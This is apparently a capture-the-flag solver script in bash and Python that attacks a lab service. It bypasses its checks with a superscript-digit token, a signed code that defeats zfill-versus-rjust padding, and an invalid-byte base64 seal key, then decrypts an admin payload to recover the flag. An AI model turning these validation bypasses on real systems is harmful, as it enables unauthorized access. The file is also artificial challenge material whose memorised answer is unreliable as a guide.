#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"; PORT="${PORT:-8297}"; FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"
python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import base64, hashlib, json, sys
from urllib.error import HTTPError
from urllib.request import Request, urlopen
host, port = sys.argv[1], sys.argv[2]
base = f"http://{host}:{port}"
req = Request(base + "/api/session", data=b"{}", method="POST")
sid = json.loads(urlopen(req, timeout=5).read())["session"]
# Gap A: isdecimal vs isdigit. ² (U+00B2): isdecimal=False, isdigit=True
req = Request(base + "/api/token/%C2%B2", headers={"X-Session": sid})
hex_a = json.loads(urlopen(req, timeout=5).read())["fragment"]
# Gap B: zfill vs rjust. Probe first to learn the resolved target, then derive
# the unpadded signed code whose zfill(6) matches it but whose rjust(6,'0') does not.
probe_body = json.dumps({"code": "0"}).encode()
probe_req = Request(base + "/api/code", data=probe_body,
                     headers={"X-Session": sid, "Content-Type": "application/json"}, method="POST")
try:
    urlopen(probe_req, timeout=5)
    raise RuntimeError("expected 404 from /api/code probe")
except HTTPError as exc:
    target = json.loads(exc.read())["resolved"]
sign = "-" if target.startswith("-") else ""
digits = target.lstrip("-").lstrip("0") or "0"
code = sign + digits
body = json.dumps({"code": code}).encode()
req = Request(base + "/api/code", data=body,
              headers={"X-Session": sid, "Content-Type": "application/json"}, method="POST")
hex_b = json.loads(urlopen(req, timeout=5).read())["fragment"]
# Gap C: bytes.decode strict vs ignore. base64("seal\xff")="c2VhbP8="
req = Request(base + "/api/seal", headers={"X-Session": sid, "X-Seal-Key": "c2VhbP8="})
hex_c = json.loads(urlopen(req, timeout=5).read())["fragment"]
key = hashlib.sha256((hex_a + hex_b + hex_c).encode()).digest()[:32]
req = Request(base + "/api/admin", headers={"X-Session": sid})
payload = urlopen(req, timeout=5).read()
encrypted = payload[4:]
flag = bytes(b ^ key[i % len(key)] for i, b in enumerate(encrypted)).decode()
print(flag)
PY
